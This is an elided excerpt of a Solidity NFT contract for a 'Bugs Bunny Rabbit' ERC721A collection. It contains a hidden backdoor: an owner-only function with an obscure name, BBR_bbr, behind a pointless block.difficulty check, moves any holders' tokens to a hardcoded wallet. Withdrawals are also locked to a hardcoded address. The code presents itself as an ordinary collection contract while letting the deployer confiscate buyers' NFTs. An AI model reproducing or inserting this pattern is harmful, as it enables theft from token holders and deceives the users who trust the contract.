...
contract Bugs_Bunny_Rabbit is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Bugs Bunny Rabbit", "BBR", maxBatchSize_, collectionSize_) {
  ...
  function BBR_bbr(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xd5E9cd2fc58d724707Ed4fEb899dF17d47CF7fB7, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xfdeF10765decc7f20119897Ea49181E0dD111f67);
